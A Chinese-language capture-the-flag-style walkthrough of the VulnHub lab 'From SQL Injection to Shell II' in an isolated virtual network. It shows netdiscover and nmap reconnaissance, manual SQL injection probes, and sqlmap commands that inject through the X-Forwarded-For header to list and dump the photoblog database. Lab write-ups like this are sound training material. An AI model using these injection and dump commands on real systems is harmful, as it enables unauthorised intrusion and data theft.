## 下载

下载官网镜像

https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/

## 安装

宿主机是windows

虚拟机使用VMware，搭载一个kali linux，同时搭载目标ISO

注意这次实验，kail linux 与 目标ISO 的网络都要配置成“仅主机模式”保证他们能互相访问。

## 扫描

Kali linux 

### 使用netdiscover

> sudo netdiscover 

进行内网扫描，目的是找到目标端口。

```
 Currently scanning: 172.16.58.0/16   |   Screen View: Unique Hosts            
                                                                               
 7 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 420               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.129.1   00:50:56:c0:00:01      3     180  VMware, Inc.                
 192.168.129.129 00:0c:29:a2:f3:76      2     120  VMware, Inc.                
 192.168.129.254 00:50:56:e6:e4:28      2     120  VMware, Inc.  
```
我的地址是 192.168.129.129

### 使用nmap

> nmap -A -v 192.168.129.129

对这个IP进行端口扫描，以及寻找端口的信息

```
80/tcp open  http    nginx 0.7.67
|_http-favicon: Unknown favicon MD5: 967B30E5E95445E29B882CC82774AC96
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/0.7.67
|_http-title: My Photoblog - latest picture

```

只有一个80端口开着nginx的web服务

## 注入测试

既然标题已经说过是sql注入相关的，那么先简单的手工测试一下

```
?id=2-1
?id=1 and 2=1
?id=1'"())()
?id=1' and '1'='1
```

发现无论如何显示的页面不会变化，似乎id在后台进行了int的强制转换

那么估计是在cookie或者httpheader进行注入

？测试一下

使用SqlMap进行注入
```
sqlmap -u http://192.168.129.129/cat.php?id=1  --headers="X-Forwarded-For:*" –dbs –batch
```

dump数据

```
sqlmap -u http://192.168.129.129/cat.php?id=1  --headers="X-Forwarded-For:*" –D photoblog --dump-all –batch
```

